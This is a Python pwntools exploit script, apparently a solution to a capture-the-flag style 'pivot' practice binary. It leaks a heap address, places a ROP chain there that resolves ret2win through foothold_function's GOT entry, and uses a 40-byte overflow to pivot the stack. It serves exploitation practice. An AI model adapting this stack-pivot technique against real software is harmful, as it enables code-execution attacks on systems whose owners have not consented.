#!/usr/bin/env python3
from pwn import *

elf = ELF("./pivot")
lib = ELF("./libpivot.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

io = process("./pivot")

xchg_rsp_rax =  0x4009bd        # xchg rsp,rax; ret
pop_rax = 0x4009bb              # pop rax; ret
pop_rbp = 0x00400829            # pop rbp; ret
add_rax_rbp  = 0x004009c4       # add rax, rbp; ret
mov_rax_addr_rax = 0x004009c0   # mov rax, qword [rax]; ret
call_rax =  0x004006b0          # call rax
foothold_ret2win_offset = 0x117

# ROP chain
io.recvuntil(b"pivot: ")
heap_addr = int(io.recvline().strip(), 16)

rop_chain = p64(elf.plt.foothold_function)
rop_chain += p64(pop_rax) + p64(elf.got.foothold_function)
rop_chain += p64(mov_rax_addr_rax)
rop_chain += p64(pop_rbp) + p64(foothold_ret2win_offset) 
rop_chain += p64(add_rax_rbp)
rop_chain += p64(call_rax)


io.send(rop_chain)

# Leak heap address
log.info(f"ROP address leak: {hex(heap_addr)}")

# Stack smash
pivot_payload = b"A" * 40
pivot_payload += p64(pop_rax) + p64(heap_addr)
pivot_payload += p64(xchg_rsp_rax)
io.send(pivot_payload)

io.interactive()

